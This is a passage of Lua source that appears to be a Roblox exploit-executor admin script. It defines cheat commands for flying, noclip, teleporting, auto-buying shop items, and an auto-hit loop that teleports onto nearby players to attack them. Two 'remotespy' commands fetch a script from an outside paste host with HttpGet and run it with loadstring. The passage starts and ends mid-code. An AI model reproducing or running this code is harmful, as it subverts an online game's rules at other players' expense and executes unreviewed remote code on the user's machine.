			local tool2 = Instance.new("HopperBin", game:GetService("Players").LocalPlayer.Backpack)
			local tool3 = Instance.new("HopperBin", game:GetService("Players").LocalPlayer.Backpack)
			local tool4 = Instance.new("HopperBin", game:GetService("Players").LocalPlayer.Backpack)
			local tool5 = Instance.new("HopperBin", game:GetService("Players").LocalPlayer.Backpack)
			tool1.BinType = "Clone"
			tool2.BinType = "GameTool"
			tool3.BinType = "Hammer"
			tool4.BinType = "Script"
			tool5.BinType = "Grab"
		end;
	});

	addCommand({
		["Name"] = "clicktp";
		["Function"] = function()
			sendNotif("", "Click TP Enabled, Keybind: Q", 15);
			plr = game.Players.LocalPlayer
			hum = plr.Character.HumanoidRootPart
			mouse = plr:GetMouse()

			mouse.KeyDown:connect(function(key)
				if key == "q" then
					if mouse.Target then
						hum.CFrame = CFrame.new(mouse.Hit.x, mouse.Hit.y + 5, mouse.Hit.z)
					end
				end
			end)
		end;
	});

	addCommand({
		["Name"] = "anonymouscall";
		["Function"] = function()
			pcall(function()
				game.Players.LocalPlayer.Character.Head.Neck:Destroy()
				game.Players.LocalPlayer.Character.UpperTorso.NeckAttachment:Destroy()
				game.Players.LocalPlayer.Character.Humanoid.HealthDisplayDistance = math.huge
				game.Players.LocalPlayer.Character.Humanoid.NameDisplayDistance = math.huge
				game.Players.LocalPlayer.Character.Head.Size = Vector3.new(0, 0, 0)
				game.Players.LocalPlayer.Character.Head.Massless = true
				game.Players.LocalPlayer.Character.Head.CanCollide = false

				heazd = true

				while heazd == true do 
					pcall(function()
						game.Players.LocalPlayer.Character.Head.NeckRigAttachment.CFrame = CFrame.new(0, 100000.4736328125, 0)
						game.Players.LocalPlayer.Character.UpperTorso.NeckRigAttachment.CFrame = CFrame.new(0, 100000.4736328125, 0)
						game.Players.LocalPlayer.Character.Head.CFrame = CFrame.new(0, 100000.4736328125, 0)
					end)
					wait()
				end
			end)

			game.Players.LocalPlayer.Character.LeftUpperLeg:Destroy()
			game.Players.LocalPlayer.Character.RightUpperLeg:Destroy()

		end;
	});

	addCommand({
		["Name"] = "remotespy";
		["Function"] = function()
			loadstring(game:HttpGet(('http://bin.shortbin.eu:8080/raw/Fr0NoMm92N'), true))()
		end;
	});

	addCommand({
		["Name"] = "remspy";
		["Function"] = function()
			loadstring(game:HttpGet(('http://bin.shortbin.eu:8080/raw/Fr0NoMm92N'), true))()
		end;
	});

	addCommand({
		["Name"] = "fly";
		["Function"] = function()
			if (loopVariables.Flying == false) then
				loopVariables.Flying = true;
				sendNotif("", "Fly Enabled, Keybind: X", 15);
				local plr = game.Players.LocalPlayer
				local mouse = plr:GetMouse()

				localplayer = plr

				if workspace:FindFirstChild("Core") then
					workspace.Core:Destroy()
				end

				local Core = Instance.new("Part")
				Core.Name = "Core"
				Core.Size = Vector3.new(0.05, 0.05, 0.05)

				spawn(function()
					Core.Parent = workspace
					local Weld = Instance.new("Weld", Core)
					Weld.Part0 = Core
					Weld.Part1 = localplayer.Character.LowerTorso
					Weld.C0 = CFrame.new(0, 0, 0)
				end)

				workspace:WaitForChild("Core")

				local torso = workspace.Core
				flying = true
				local speed = 20
				local keys = {
					a = false,
					d = false,
					w = false,
					s = false
				}
				local e1
				local e2
				local function start()
					local pos = Instance.new("BodyPosition", torso)
					local gyro = Instance.new("BodyGyro", torso)
					pos.Name = "EPIXPOS"
					pos.maxForce = Vector3.new(math.huge, math.huge, math.huge)
					pos.position = torso.Position
					gyro.maxTorque = Vector3.new(9e9, 9e9, 9e9)
					gyro.cframe = torso.CFrame
					repeat
						wait()
						localplayer.Character.Humanoid.PlatformStand = true
						local new = gyro.cframe - gyro.cframe.p + pos.position
						if not keys.w and not keys.s and not keys.a and not keys.d then
							speed = 20
						end
						if keys.w then
							new = new + workspace.CurrentCamera.CoordinateFrame.lookVector * speed
							speed = speed + 0
						end
						if keys.s then
							new = new - workspace.CurrentCamera.CoordinateFrame.lookVector * speed
							speed = speed + 0
						end
						if keys.d then
							new = new * CFrame.new(speed, 0, 0)
							speed = speed + 0
						end
						if keys.a then
							new = new * CFrame.new(-speed, 0, 0)
							speed = speed + 0
						end
						if speed > 10 then
							speed = 20
						end
						pos.position = new.p
						if keys.w then
							gyro.cframe = workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad(speed * 0), 0, 0)
						elseif keys.s then
							gyro.cframe = workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(math.rad(speed * 0), 0, 0)
						else
							gyro.cframe = workspace.CurrentCamera.CoordinateFrame
						end
					until flying == false
					if gyro then
						gyro:Destroy()
					end
					if pos then
						pos:Destroy()
					end
					flying = false
					localplayer.Character.Humanoid.PlatformStand = false
					speed = 20
				end
				e1 = mouse.KeyDown:connect(function(key)
					if not torso or not torso.Parent then
						flying = false
						e1:disconnect()
						e2:disconnect()
						return
					end
					if key == "w" then
						keys.w = true
					elseif key == "s" then
						keys.s = true
					elseif key == "a" then
						keys.a = true
					elseif key == "d" then
						keys.d = true
					elseif key == "x" then
						if flying == true then
							flying = false
						else
							flying = true
							start()
						end
					end
				end)
				e2 = mouse.KeyUp:connect(function(key)
					if key == "w" then
						keys.w = false
					elseif key == "s" then
						keys.s = false
					elseif key == "a" then
						keys.a = false
					elseif key == "d" then
						keys.d = false
					end
				end)
				start()
			else
				loopVariables.Flying = false;
				sendNotif("", "Fly Disabled.", 15);
				if (game:GetService("Workspace"):FindFirstChild("Core")) then
					game:GetService("Workspace"):FindFirstChild("Core"):Destroy()
				end;
			end;
		end;
	});

	addCommand({
		["Name"] = "freecam";
		["Function"] = function()
			sendNotif("", "Freecam Enabled, Keybind: B", 15);
			------------------------------------------------------------------------
			-- Freecam
			-- Cinematic free camera for spectating and video production.
			------------------------------------------------------------------------

			local pi    = math.pi
			local abs   = math.abs
			local clamp = math.clamp
			local exp   = math.exp
			local rad   = math.rad
			local sign  = math.sign
			local sqrt  = math.sqrt
			local tan   = math.tan

			local ContextActionService = game:GetService("ContextActionService")
			local Players = game:GetService("Players")
			local RunService = game:GetService("RunService")
			local StarterGui = game:GetService("StarterGui")
			local UserInputService = game:GetService("UserInputService")
			local Workspace = game:GetService("Workspace")

			local LocalPlayer = Players.LocalPlayer
			if not LocalPlayer then
				Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
				LocalPlayer = Players.LocalPlayer
			end

			local Camera = Workspace.CurrentCamera
			Workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
				local newCamera = Workspace.CurrentCamera
				if newCamera then
					Camera = newCamera
				end
			end)

			------------------------------------------------------------------------

			local TOGGLE_INPUT_PRIORITY = Enum.ContextActionPriority.Low.Value
			local INPUT_PRIORITY = Enum.ContextActionPriority.High.Value
			local FREECAM_MACRO_KB = Enum.KeyCode.B

			local NAV_GAIN = Vector3.new(1, 1, 1)*64
			local PAN_GAIN = Vector2.new(0.75, 1)*8
			local FOV_GAIN = 300

			local PITCH_LIMIT = rad(90)

			local VEL_STIFFNESS = 1.5
			local PAN_STIFFNESS = 1.0
			local FOV_STIFFNESS = 4.0

			------------------------------------------------------------------------

			local Spring = {} do
				Spring.__index = Spring

				function Spring.new(freq, pos)
					local self = setmetatable({}, Spring)
					self.f = freq
					self.p = pos
					self.v = pos*0
					return self
				end

				function Spring:Update(dt, goal)
					local f = self.f*2*pi
					local p0 = self.p
					local v0 = self.v

					local offset = goal - p0
					local decay = exp(-f*dt)

					local p1 = goal + (v0*dt - offset*(f*dt + 1))*decay
					local v1 = (f*dt*(offset*f - v0) + v0)*decay

					self.p = p1
					self.v = v1

					return p1
				end

				function Spring:Reset(pos)
					self.p = pos
					self.v = pos*0
				end
			end

			------------------------------------------------------------------------

			local cameraPos = Vector3.new()
			local cameraRot = Vector2.new()
			local cameraFov = 0

			local velSpring = Spring.new(VEL_STIFFNESS, Vector3.new())
			local panSpring = Spring.new(PAN_STIFFNESS, Vector2.new())
			local fovSpring = Spring.new(FOV_STIFFNESS, 0)

			------------------------------------------------------------------------

			local Input = {} do
				local thumbstickCurve do
					local K_CURVATURE = 2.0
					local K_DEADZONE = 0.15

					local function fCurve(x)
						return (exp(K_CURVATURE*x) - 1)/(exp(K_CURVATURE) - 1)
					end

					local function fDeadzone(x)
						return fCurve((x - K_DEADZONE)/(1 - K_DEADZONE))
					end

					function thumbstickCurve(x)
						return sign(x)*clamp(fDeadzone(abs(x)), 0, 1)
					end
				end

				local gamepad = {
					ButtonX = 0,
					ButtonY = 0,
					DPadDown = 0,
					DPadUp = 0,
					ButtonL2 = 0,
					ButtonR2 = 0,
					Thumbstick1 = Vector2.new(),
					Thumbstick2 = Vector2.new(),
				}

				local keyboard = {
					W = 0,
					A = 0,
					S = 0,
					D = 0,
					E = 0,
					Q = 0,
					U = 0,
					H = 0,
					J = 0,
					K = 0,
					I = 0,
					Y = 0,
					Up = 0,
					Down = 0,
					LeftShift = 0,
					RightShift = 0,
				}

				local mouse = {
					Delta = Vector2.new(),
					MouseWheel = 0,
				}

				local NAV_GAMEPAD_SPEED  = Vector3.new(1, 1, 1)
				local NAV_KEYBOARD_SPEED = Vector3.new(1, 1, 1)
				local PAN_MOUSE_SPEED    = Vector2.new(1, 1)*(pi/64)
				local PAN_GAMEPAD_SPEED  = Vector2.new(1, 1)*(pi/8)
				local FOV_WHEEL_SPEED    = 1.0
				local FOV_GAMEPAD_SPEED  = 0.25
				local NAV_ADJ_SPEED      = 0.75
				local NAV_SHIFT_MUL      = 0.25

				local navSpeed = 1

				function Input.Vel(dt)
					navSpeed = clamp(navSpeed + dt*(keyboard.Up - keyboard.Down)*NAV_ADJ_SPEED, 0.01, 4)

					local kGamepad = Vector3.new(
						thumbstickCurve(gamepad.Thumbstick1.x),
						thumbstickCurve(gamepad.ButtonR2) - thumbstickCurve(gamepad.ButtonL2),
						thumbstickCurve(-gamepad.Thumbstick1.y)
					)*NAV_GAMEPAD_SPEED

					local kKeyboard = Vector3.new(
						keyboard.D - keyboard.A + keyboard.K - keyboard.H,
						keyboard.E - keyboard.Q + keyboard.I - keyboard.Y,
						keyboard.S - keyboard.W + keyboard.J - keyboard.U
					)*NAV_KEYBOARD_SPEED

					local shift = UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) or UserInputService:IsKeyDown(Enum.KeyCode.RightShift)

					return (kGamepad + kKeyboard)*(navSpeed*(shift and NAV_SHIFT_MUL or 1))
				end

				function Input.Pan(dt)
					local kGamepad = Vector2.new(
						thumbstickCurve(gamepad.Thumbstick2.y),
						thumbstickCurve(-gamepad.Thumbstick2.x)
					)*PAN_GAMEPAD_SPEED
					local kMouse = mouse.Delta*PAN_MOUSE_SPEED
					mouse.Delta = Vector2.new()
					return kGamepad + kMouse
				end

				function Input.Fov(dt)
					local kGamepad = (gamepad.ButtonX - gamepad.ButtonY)*FOV_GAMEPAD_SPEED
					local kMouse = mouse.MouseWheel*FOV_WHEEL_SPEED
					mouse.MouseWheel = 0
					return kGamepad + kMouse
				end

				do
					local function Keypress(action, state, input)
						keyboard[input.KeyCode.Name] = state == Enum.UserInputState.Begin and 1 or 0
						return Enum.ContextActionResult.Sink
					end

					local function GpButton(action, state, input)
						gamepad[input.KeyCode.Name] = state == Enum.UserInputState.Begin and 1 or 0
						return Enum.ContextActionResult.Sink
					end

					local function MousePan(action, state, input)
						local delta = input.Delta
						mouse.Delta = Vector2.new(-delta.y, -delta.x)
						return Enum.ContextActionResult.Sink
					end

					local function Thumb(action, state, input)
						gamepad[input.KeyCode.Name] = input.Position
						return Enum.ContextActionResult.Sink
					end

					local function Trigger(action, state, input)
						gamepad[input.KeyCode.Name] = input.Position.z
						return Enum.ContextActionResult.Sink
					end

					local function MouseWheel(action, state, input)
						mouse[input.UserInputType.Name] = -input.Position.z
						return Enum.ContextActionResult.Sink
					end

					local function Zero(t)
						for k, v in pairs(t) do
							t[k] = v*0
						end
					end

					function Input.StartCapture()
						ContextActionService:BindActionAtPriority("FreecamKeyboard", Keypress, false, INPUT_PRIORITY,
							Enum.KeyCode.W, Enum.KeyCode.U,
							Enum.KeyCode.A, Enum.KeyCode.H,
							Enum.KeyCode.S, Enum.KeyCode.J,
							Enum.KeyCode.D, Enum.KeyCode.K,
							Enum.KeyCode.E, Enum.KeyCode.I,
							Enum.KeyCode.Q, Enum.KeyCode.Y,
							Enum.KeyCode.Up, Enum.KeyCode.Down
						)
						ContextActionService:BindActionAtPriority("FreecamMousePan",          MousePan,   false, INPUT_PRIORITY, Enum.UserInputType.MouseMovement)
						ContextActionService:BindActionAtPriority("FreecamMouseWheel",        MouseWheel, false, INPUT_PRIORITY, Enum.UserInputType.MouseWheel)
						ContextActionService:BindActionAtPriority("FreecamGamepadButton",     GpButton,   false, INPUT_PRIORITY, Enum.KeyCode.ButtonX, Enum.KeyCode.ButtonY)
						ContextActionService:BindActionAtPriority("FreecamGamepadTrigger",    Trigger,    false, INPUT_PRIORITY, Enum.KeyCode.ButtonR2, Enum.KeyCode.ButtonL2)
						ContextActionService:BindActionAtPriority("FreecamGamepadThumbstick", Thumb,      false, INPUT_PRIORITY, Enum.KeyCode.Thumbstick1, Enum.KeyCode.Thumbstick2)
					end

					function Input.StopCapture()
						navSpeed = 1
						Zero(gamepad)
						Zero(keyboard)
						Zero(mouse)
						ContextActionService:UnbindAction("FreecamKeyboard")
						ContextActionService:UnbindAction("FreecamMousePan")
						ContextActionService:UnbindAction("FreecamMouseWheel")
						ContextActionService:UnbindAction("FreecamGamepadButton")
						ContextActionService:UnbindAction("FreecamGamepadTrigger")
						ContextActionService:UnbindAction("FreecamGamepadThumbstick")
					end
				end
			end

			local function GetFocusDistance(cameraFrame)
				local znear = 0.1
				local viewport = Camera.ViewportSize
				local projy = 2*tan(cameraFov/2)
				local projx = viewport.x/viewport.y*projy
				local fx = cameraFrame.rightVector
				local fy = cameraFrame.upVector
				local fz = cameraFrame.lookVector

				local minVect = Vector3.new()
				local minDist = 512

				for x = 0, 1, 0.5 do
					for y = 0, 1, 0.5 do
						local cx = (x - 0.5)*projx
						local cy = (y - 0.5)*projy
						local offset = fx*cx - fy*cy + fz
						local origin = cameraFrame.p + offset*znear
						local _, hit = Workspace:FindPartOnRay(Ray.new(origin, offset.unit*minDist))
						local dist = (hit - origin).magnitude
						if minDist > dist then
							minDist = dist
							minVect = offset.unit
						end
					end
				end

				return fz:Dot(minVect)*minDist
			end

			------------------------------------------------------------------------

			local function StepFreecam(dt)
				local vel = velSpring:Update(dt, Input.Vel(dt))
				local pan = panSpring:Update(dt, Input.Pan(dt))
				local fov = fovSpring:Update(dt, Input.Fov(dt))

				local zoomFactor = sqrt(tan(rad(70/2))/tan(rad(cameraFov/2)))

				cameraFov = clamp(cameraFov + fov*FOV_GAIN*(dt/zoomFactor), 1, 120)
				cameraRot = cameraRot + pan*PAN_GAIN*(dt/zoomFactor)
				cameraRot = Vector2.new(clamp(cameraRot.x, -PITCH_LIMIT, PITCH_LIMIT), cameraRot.y%(2*pi))

				local cameraCFrame = CFrame.new(cameraPos)*CFrame.fromOrientation(cameraRot.x, cameraRot.y, 0)*CFrame.new(vel*NAV_GAIN*dt)
				cameraPos = cameraCFrame.p

				Camera.CFrame = cameraCFrame
				Camera.Focus = cameraCFrame*CFrame.new(0, 0, -GetFocusDistance(cameraCFrame))
				Camera.FieldOfView = cameraFov
			end

			------------------------------------------------------------------------

			local PlayerState = {} do
				local mouseBehavior
				local mouseIconEnabled
				local cameraType
				local cameraFocus
				local cameraCFrame
				local cameraFieldOfView
				local screenGuis = {}
				local coreGuis = {
					Backpack = true,
					Chat = true,
					Health = true,
					PlayerList = true,
				}
				local setCores = {
					BadgesNotificationsActive = true,
					PointsNotificationsActive = true,
				}

				-- Save state and set up for freecam
				function PlayerState.Push()
					for name in pairs(coreGuis) do
						coreGuis[name] = StarterGui:GetCoreGuiEnabled(Enum.CoreGuiType[name])
						StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType[name], false)
					end
					for name in pairs(setCores) do
						setCores[name] = StarterGui:GetCore(name)
						StarterGui:SetCore(name, false)
					end
					local playergui = LocalPlayer:FindFirstChildOfClass("PlayerGui")
					if playergui then
						for _, gui in pairs(playergui:GetChildren()) do
							if gui:IsA("ScreenGui") and gui.Enabled then
								screenGuis[#screenGuis + 1] = gui
								gui.Enabled = false
							end
						end
					end

					cameraFieldOfView = Camera.FieldOfView
					Camera.FieldOfView = 70

					cameraType = Camera.CameraType
					Camera.CameraType = Enum.CameraType.Custom

					cameraCFrame = Camera.CFrame
					cameraFocus = Camera.Focus

					mouseIconEnabled = UserInputService.MouseIconEnabled
					UserInputService.MouseIconEnabled = false

					mouseBehavior = UserInputService.MouseBehavior
					UserInputService.MouseBehavior = Enum.MouseBehavior.Default
				end

				-- Restore state
				function PlayerState.Pop()
					for name, isEnabled in pairs(coreGuis) do
						StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType[name], isEnabled)
					end
					for name, isEnabled in pairs(setCores) do
						StarterGui:SetCore(name, isEnabled)
					end
					for _, gui in pairs(screenGuis) do
						if gui.Parent then
							gui.Enabled = true
						end
					end

					Camera.FieldOfView = cameraFieldOfView
					cameraFieldOfView = nil

					Camera.CameraType = cameraType
					cameraType = nil

					Camera.CFrame = cameraCFrame
					cameraCFrame = nil

					Camera.Focus = cameraFocus
					cameraFocus = nil

					UserInputService.MouseIconEnabled = mouseIconEnabled
					mouseIconEnabled = nil

					UserInputService.MouseBehavior = mouseBehavior
					mouseBehavior = nil
				end
			end

			local function StartFreecam()
				local cameraCFrame = Camera.CFrame
				cameraRot = Vector2.new(cameraCFrame:toEulerAnglesYXZ())
				cameraPos = cameraCFrame.p
				cameraFov = Camera.FieldOfView

				velSpring:Reset(Vector3.new())
				panSpring:Reset(Vector2.new())
				fovSpring:Reset(0)

				PlayerState.Push()
				RunService:BindToRenderStep("Freecam", Enum.RenderPriority.Camera.Value, StepFreecam)
				Input.StartCapture()
			end

			local function StopFreecam()
				Input.StopCapture()
				RunService:UnbindFromRenderStep("Freecam")
				PlayerState.Pop()
			end

			------------------------------------------------------------------------

			do
				local enabled = false

				local function ToggleFreecam()
					if enabled then
						StopFreecam()
					else
						StartFreecam()
					end
					enabled = not enabled
				end

				local function HandleActivationInput(action, state, input)
					if state == Enum.UserInputState.Begin then
						if input.KeyCode == FREECAM_MACRO_KB then
							ToggleFreecam()
						end
					end
					return Enum.ContextActionResult.Pass
				end

				ContextActionService:BindActionAtPriority("FreecamToggle", HandleActivationInput, false, TOGGLE_INPUT_PRIORITY, FREECAM_MACRO_KB)
			end
		end;
	});

	addCommand({
		["Name"] = "noclip";
		["Function"] = function()
			if (loopVariables.Noclip == false) then
				loopVariables.Noclip = true;
				sendNotif("", "Noclip Enabled.");
			else
				loopVariables.Noclip = false;
				sendNotif("", "Noclip Disabled.");
			end;
			game:GetService('RunService').Stepped:connect(function()
				if loopVariables.Noclip == true then
					game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
				end
			end)
		end;
	});


	

	addCommand({
		["Name"] = "antigrab";
		["Function"] = function()
			while true do
				wait()
				if game.Players.LocalPlayer.Character:FindFirstChild("GRABBING_CONSTRAINT") then
					game.Players.LocalPlayer.Character.GRABBING_CONSTRAINT:Destroy()
				end
			end
		end;
	});


addCommand({
		["Name"] = "automask";
		["Function"] = function()
        		local savepos = game.Players.LocalPlayer.Character.UpperTorso.Position
			local lol = game.Workspace.Ignored.Shop["[Surgeon Mask] - $25"]
			game.Players.LocalPlayer.Character:MoveTo(lol.Head.Position)
			wait(0.25)
			fireclickdetector(lol.ClickDetector,4)
			wait(0.25)
			if game.Players.LocalPlayer.Backpack:FindFirstChild("Mask") then
				game.Players.LocalPlayer.Backpack:FindFirstChild("Mask").Parent = game.Players.LocalPlayer.Character
			end
			wait()
			game.Players.LocalPlayer.Character.Mask:Activate()
			game.Players.LocalPlayer.Character:MoveTo(savepos)
		end;
	});


addCommand({
		["Name"] = "autohit";
		["Function"] = function()
        while wait() do
	pcall(function()
		if game.Players.LocalPlayer.Backpack:FindFirstChild("Combat") then
			game.Players.LocalPlayer.Backpack:FindFirstChild("Combat").Parent = game.Players.LocalPlayer.Character
		end
		wait()
		game.Players.LocalPlayer.Character:FindFirstChild("Combat"):Activate()
		if game.Players.LocalPlayer.Character then
			if game.Players.LocalPlayer.character:FindFirstChild("HumanoidRootPart") then
				returnpos = game.Players.LocalPlayer.character:FindFirstChild("HumanoidRootPart").CFrame
			end
		end    
		wait(1.1)

		for i,v in pairs(game.Players:GetChildren()) do
			if v.Name ~= game.Players.LocalPlayer.Name and v.Name ~= "Vortextures" and v.Name ~= "Vortexturize" and v.Name ~= "Vortexturable" then
				if v.Character then
					if v.Character:FindFirstChild("HumanoidRootPart") then
						distance = game.Players.LocalPlayer:DistanceFromCharacter(v.Character.HumanoidRootPart.Position)

						if distance < 35 then
							for i = 1,5 do
								if v then
									if v.Character and game.Players.LocalPlayer.Character then
										if v.Character:FindFirstChild("HumanoidRootPart") and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and v.Character.Humanoid.Health > 10 then
											game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = v.Character:FindFirstChild("HumanoidRootPart").CFrame * CFrame.new(0,0,0.7)
										end
									end
								end
								game.Workspace.CurrentCamera.CFrame = CFrame.new(game.Workspace.CurrentCamera.CFrame.p, v.Character.HumanoidRootPart.CFrame.p)
								wait(0.05)
							end

						end

					end
				end
			end
		end
	end)
end
		end;
	});


addCommand({
		["Name"] = "burgersheild";
		["Function"] = function()
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripPos     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripForward     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripRight     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripUp     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].Parent = game.Players.LocalPlayer.Character

game.Players.LocalPlayer.Backpack["[Hamburger]"].GripPos     = Vector3.new(1, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripForward     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripRight     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripUp     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].Parent = game.Players.LocalPlayer.Character

game.Players.LocalPlayer.Backpack["[Hamburger]"].GripPos     = Vector3.new(2, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripForward     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripRight     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripUp     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].Parent = game.Players.LocalPlayer.Character

game.Players.LocalPlayer.Backpack["[Hamburger]"].GripPos     = Vector3.new(-1, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripForward     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripRight     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripUp     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].Parent = game.Players.LocalPlayer.Character

game.Players.LocalPlayer.Backpack["[Hamburger]"].GripPos     = Vector3.new(-1, 1, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripForward     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripRight     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripUp     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].Parent = game.Players.LocalPlayer.Character

game.Players.LocalPlayer.Backpack["[Hamburger]"].GripPos     = Vector3.new(0, 1, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripForward     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripRight     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripUp     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].Parent = game.Players.LocalPlayer.Character

game.Players.LocalPlayer.Backpack["[Hamburger]"].GripPos     = Vector3.new(1, 1, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripForward     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripRight     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripUp     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].Parent = game.Players.LocalPlayer.Character

game.Players.LocalPlayer.Backpack["[Hamburger]"].GripPos     = Vector3.new(2, 1, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripForward     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripRight     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripUp     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].Parent = game.Players.LocalPlayer.Character

game.Players.LocalPlayer.Backpack["[Hamburger]"].GripPos     = Vector3.new(2, -1, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripForward     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripRight     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripUp     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].Parent = game.Players.LocalPlayer.Character

game.Players.LocalPlayer.Backpack["[Hamburger]"].GripPos     = Vector3.new(1, -1, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripForward     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripRight     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripUp     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].Parent = game.Players.LocalPlayer.Character

game.Players.LocalPlayer.Backpack["[Hamburger]"].GripPos     = Vector3.new(0, -1, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripForward     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripRight     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripUp     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].Parent = game.Players.LocalPlayer.Character

game.Players.LocalPlayer.Backpack["[Hamburger]"].GripPos     = Vector3.new(-1, -1, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripForward     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripRight     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].GripUp     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Hamburger]"].Parent = game.Players.LocalPlayer.Character

game.Players.LocalPlayer.Backpack["[Knife]"].GripPos     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Knife]"].GripForward     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Knife]"].GripRight     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Knife]"].GripUp     = Vector3.new(0, 0, 0)
game.Players.LocalPlayer.Backpack["[Knife]"].Parent = game.Players.LocalPlayer.Character
		end;
	});


addCommand({
		["Name"] = "tornado";
		["Function"] = function()
        pcall(function()
	for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
		if v.Name == '[Knife]' then
			v.Parent = game.Players.LocalPlayer.Character
		end
	end
end)
pcall(function()
end)
wait(.9)
local targetpos = CFrame.new(-278.063446, 21.75, -240.871841)
local plr = game.Players.LocalPlayer
local pos = plr.Character.HumanoidRootPart.Position
if not game.Players.LocalPlayer.Character:FindFirstChild("[Knife]") then
	plr.Character.HumanoidRootPart.CFrame = targetpos
	local cd = game:GetService("Workspace").Ignored.Shop["[Knife] - $150"]:FindFirstChild("ClickDetector")
	wait(.9)
	fireclickdetector(cd)
	wait(.4)
	game.Players.LocalPlayer.Backpack["[Knife]"].GripPos     = Vector3.new(2, -5, -1.5)
	game.Players.LocalPlayer.Backpack["[Knife]"].GripForward     = Vector3.new(0, 0, 0)
	game.Players.LocalPlayer.Backpack["[Knife]"].GripRight     = Vector3.new(1, 0, -3)
	game.Players.LocalPlayer.Backpack["[Knife]"].GripUp     = Vector3.new(0, 0, 0)
	game.Players.LocalPlayer.Backpack["[Knife]"].Handle.Size = Vector3.new(10,0.5,0)
	game.Players.LocalPlayer.Backpack["[Knife]"].Parent = game.Players.LocalPlayer.Character
	spin = true
	local spinSpeed = 100
	local speaker = game.Players.LocalPlayer
	for i,v in pairs(speaker.Character.HumanoidRootPart:GetChildren()) do
		if v.Name == "Spinning" then
			v:Destroy()
		end
	end
	local Spin = Instance.new("BodyAngularVelocity", speaker.Character.HumanoidRootPart)
	Spin.Name = "Spinning"
	Spin.MaxTorque = Vector3.new(0, math.huge, 0)
	Spin.AngularVelocity = Vector3.new(0,spinSpeed,0)
	wait(0.6)
end

end;
});

addCommand({
    ["Name"] = "sheildburger";
    ["Function"] = function()
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripPos     = Vector3.new(0, 0, 0)
